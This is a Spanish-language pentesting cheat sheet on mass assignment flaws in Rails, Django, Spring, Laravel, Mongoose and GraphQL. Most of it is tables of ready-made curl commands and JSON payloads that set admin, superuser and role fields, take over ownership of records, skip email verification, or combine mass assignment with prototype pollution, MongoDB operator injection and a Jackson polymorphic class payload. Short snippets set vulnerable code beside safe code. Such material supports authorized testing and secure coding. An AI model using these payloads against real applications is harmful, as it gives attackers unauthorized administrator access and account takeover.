---
aliases:
  - Rails Strong Params
  - Django ModelForm
  - Spring Autobinding
  - Laravel Fillable
  - Mongoose Strict
tags:
  - vuln/mass-assignment
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Mass Assignment]]"
---
# Mass Assignment - Frameworks Vulnerables

---

## Rails

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X PATCH https://target/users/1 -d '{"user":{"name":"x","is_admin":true}}'` | Privesc via is_admin | Strong params permit incomplete o `permit!`. |
| `curl -X PATCH https://target/users/1 -d '{"user":{"role":"admin"}}'` | Role-string privesc | Devise / custom role field. |
| `curl -X POST https://target/api/posts -d '{"post":{"title":"x","user_id":1}}'` | Hijack ownership con accept_nested_attributes | Nested attrs sin filtro. |
| `curl -X PATCH https://target/users/1 -d '{"user":{"...","admin":true}}'` | Privesc con field naming alternative | App con field `admin` corto. |
| Verificar `permit!` con response code 200 + sensitive field aplicado | Confirma vuln | Backend Rails legacy. |
^ma-fw-rails

### Rails strong_params bypass ejemplo

```ruby
# VULN — params.permit! (permit all)
@user.update(params[:user].permit!)

# VULN — incomplete whitelist
@user.update(params.require(:user).permit(:name, :email))
# Si el modelo agrega is_admin después, atacante explota la brecha

# Atacante explota
PATCH /users/1 con body: {"user":{"name":"x","is_admin":true}}
```

---

## Django

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST https://target/api/users/ -d '{"username":"x","is_superuser":true,"is_staff":true}'` | Django superuser + admin panel | DRF ModelSerializer con `fields='__all__'`. |
| `curl -X PATCH https://target/api/users/1/ -d '{"is_active":true,"is_staff":true}'` | Reactivate + admin via DRF | DRF sin `read_only_fields`. |
| `curl -X POST https://target/users/ -d '{"username":"x","groups":[1,2,3]}'` | Group membership inject | Default Django con groups field. |
| `curl ... -d '{"is_superuser":true}'` y verificar `/admin/` access | Confirma privesc Django | Backend Django + admin enabled. |
^ma-fw-django

### Django DRF anti-pattern

```python
# VULN
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'   # ← BAD: incluye is_superuser, is_staff

# SAFE
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['username', 'email']
        read_only_fields = ['is_superuser', 'is_staff']
```

---

## Spring (Java)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST https://target/api/users -H "Content-Type: application/json" -d '{"name":"x","admin":true,"roles":["ADMIN"]}'` | Privesc via Jackson autobind | DTO sin `@JsonIgnore` en sensitive fields. |
| `curl -X PUT https://target/api/users/1 -d '{"id":1,"role":"ADMIN"}'` | Update completo via objectMapper | `readerForUpdating` sin filter. |
| Inject field via `@RequestBody UserDTO` con campo extra | Spring autobind aplica | DTO con todos los fields del entity. |
| `curl -X POST https://target/api/users -d '{"@class":"com.evil.Pwn"}'` | Class instantiation arbitrary | Jackson `@JsonAutoDetect ALL` + polymorphic enabled. |
| Lombok `@Data` model + endpoint POST con todos los fields del entity | Auto-generated setters explotables | Lombok sin `@JsonIgnore`. |
^ma-fw-spring

---

## Laravel (PHP)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X PUT https://target/api/users/1 -d '{"name":"x","is_admin":true}'` | Privesc | `$guarded = []` o fillable incompleto. |
| `curl -X POST https://target/api/users -d '{"email":"x@y.z","password":"x","role":"admin"}'` | Privesc via signup | Eloquent `create(request->all())` standard. |
| `curl -X PATCH https://target/api/users/1 -d '{"...","email_verified_at":"2024-01-01"}'` | Skip email verification | `email_verified_at` mutable via fillable. |
| Inject `"force_fill":true` o usar `forceFill()` endpoint | Bypass fillable/guarded | Endpoint usa `forceFill`. |
| `curl ... -d '{"...","spatie_role":"admin"}'` | Spatie permission privesc | Spatie sin admin gate. |
^ma-fw-laravel

### Laravel anti-pattern

```php
// VULN — guarded vacío = todo fillable
class User extends Model {
    protected $guarded = [];  // ← BAD
}
$user->update($request->all());

// SAFE
class User extends Model {
    protected $fillable = ['name', 'email', 'phone'];
}
```

---

## Mongoose / NoSQL ORMs

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X PUT https://target/api/users/1 -d '{"name":"x","isAdmin":true}'` | Privesc Mongoose con strict false | Schema con `strict: false`. |
| `curl ... -d '{"__proto__":{"isAdmin":true}}'` | Prototype Pollution + Mass Assign combo | App usa `_.merge` o `Object.assign` en update. |
| `curl ... -d '{"constructor":{"prototype":{"isAdmin":true}}}'` | PP variant cuando `__proto__` filtrado | Filter strip `__proto__`. |
| `curl -X POST https://target/api/items -d '{"title":"x","ownerId":1}'` | Hijack ownership | Sequelize `update(req.body)` sin `fields:[...]`. |
| Inject `{"$set":{"isAdmin":true}}` en update | MongoDB operator inject + Mass Assign | App pasa body directo a `findOneAndUpdate`. |
| `curl ... -d '{"createdAt":{"$gt":"..."}}'` | Filter inject + Mass Assign combo | NoSQL filter + body ambos atacables. |
^ma-fw-mongoose

---

## GraphQL Input Types

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"{__type(name:\"UpdateUserInput\"){inputFields{name type{name}}}}"}` | Lista de campos del input type | Pre-explotación — discover fields. |
| `{"query":"mutation{updateUser(input:{name:\"x\",isAdmin:true}){id}}"}` | Privesc via input type | isAdmin expuesto en input. |
| `{"query":"mutation{updateUser(input:{role:\"admin\",permissions:[\"*\"]}){id}}"}` | Role + permissions inject | Input con role/permissions. |
| `{"query":"mutation($i:UserInput){updateUser(input:$i){id}}", "variables":{"i":{"isAdmin":true}}}` | Mass assign via variables | JSON variables passthrough. |
| `{"query":"mutation{createOrder(input:{userId:1,total:0}){id}}"}` | Hijack ownership + financial | Input acepta userId. |
^ma-fw-graphql

### Workflow GraphQL Mass Assignment

```bash
# 1. Discover input type
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__type(name:\"UpdateUserInput\"){inputFields{name type{name}}}}"}' \
  https://target/graphql

# 2. Identificar fields sensibles en output: isAdmin, role, permissions, user_id, etc

# 3. Inject en mutation
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUser(input:{name:\"x\",isAdmin:true,role:\"admin\"}){id role isAdmin}}"}' \
  https://target/graphql
```

---
